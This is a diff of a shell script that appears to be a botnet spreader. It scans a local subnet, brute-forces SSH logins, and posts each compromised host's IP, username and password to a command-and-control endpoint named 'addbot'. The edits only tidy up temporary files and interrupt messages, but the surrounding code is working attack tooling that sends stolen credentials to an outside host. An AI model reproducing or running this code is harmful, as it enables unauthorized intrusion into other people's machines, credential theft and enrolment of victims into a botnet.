@@ -2,9 +2,6 @@
 
 source ../.config
 
-rm userPassIPFile.txt
-
-
 val=""
 echo $destIP > temp.txt
 val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" temp.txt)
@@ -19,6 +16,7 @@ then
 else
 	echo "trying with $ip.0/24"
 fi
+rm temp.txt
 
 # Scan network helper
 is_alive_ping()
@@ -72,7 +70,6 @@ sshTry()
 		# exit 0
 	else
 		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
-		echo "$val" >>$OUTPUTFILE
 		echo "$val added"
 	fi
 }
@@ -83,7 +80,7 @@ n=1
 k=1
 while (($n <=5 ))
 do
-	trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";exit 0' INT
+	trap 'echo ""; echo"" ;echo "Terminated by the user";rm ips.txt; echo"";echo "exiting this $1";exit 0' INT
 	echo ""
 	echo ""
 	echo "running the script for the $k th time"
@@ -122,6 +119,5 @@ do
 	sleep 4
 	echo ""
 	echo ""
+	rm ips.txt
 done
-
-rm temp.txt
